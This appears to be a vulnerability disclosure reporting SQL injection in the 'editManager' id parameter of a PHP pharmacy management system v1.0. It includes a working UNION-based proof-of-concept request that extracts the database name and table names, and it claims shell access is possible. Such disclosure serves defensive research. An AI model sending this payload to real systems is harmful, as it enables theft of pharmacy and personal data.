# pharmacy_Management_System-in-php  via to sql injection

****

## NAME OF AFFECTED PRODUCT(S)

**pharmacy-management-system-in-php-with-source-code**

## Vendor Homepage

https://code-projects.org/pharmacy-management-system-in-php-with-source-code/

##  **Manufacturers sites:**

 https://code-projects.org/

# AFFECTED  VERSION(S)

## Vulnerable File

index.php

## VERSION(S)

-  v1.0

## Software Link

 https://download-media.code-projects.org/2020/10/Pharmacy_Management_System_In_PHP_With_Source_Code.zip



# PROBLEM TYPE

## Vulnerability Type

- sql injection

## Root Cause

The vulnerability file is in the root directory of Index.php

You can see that the request is id，The managerId is concatenated to an SQL statement, triggering an SQL injection vulnerability.

![image-20240816202621012](https://github.com/user-attachments/assets/18908b60-23c5-4780-93a6-59fa4d30d7a8)

## Impact

 SQL injection can obtain database information and obtain server permissions.

## **Description of the vulnerability**

pharmacy_Management_System wite souce in php  editManager has SQL injection, which can get information about the database and even GetShell via SQL injection

## **Vulnerability recurrence**

We need to set up this PMS website locally

Let's open the  /Index.php?id=allManager  route

![image-20240723105418419](https://github.com/user-attachments/assets/381f498c-f9f3-4679-a607-0f3db402e536)

**POC**

```
GET /index.php?action=editManager&id=8}'+union+select+1,database(),(SELECT+GROUP_CONCAT(table_name)+FROM+information_schema.tables+WHERE+table_schema=database()),4,5,6,7,8+order+by+id+limit+0,1--+ HTTP/1.1
```

![image-20240723125248656](https://github.com/user-attachments/assets/f86c3631-56bb-4cac-a639-1b7a02c3074b)

**Result**

We can get the database name, table name, etc

![image-20240723125309098](https://github.com/user-attachments/assets/811bd17f-3fba-4ba5-ac1a-87291d554f71)

![image-20240723134203341](https://github.com/user-attachments/assets/63c11e73-885d-43cd-88bf-49969b271fc2)
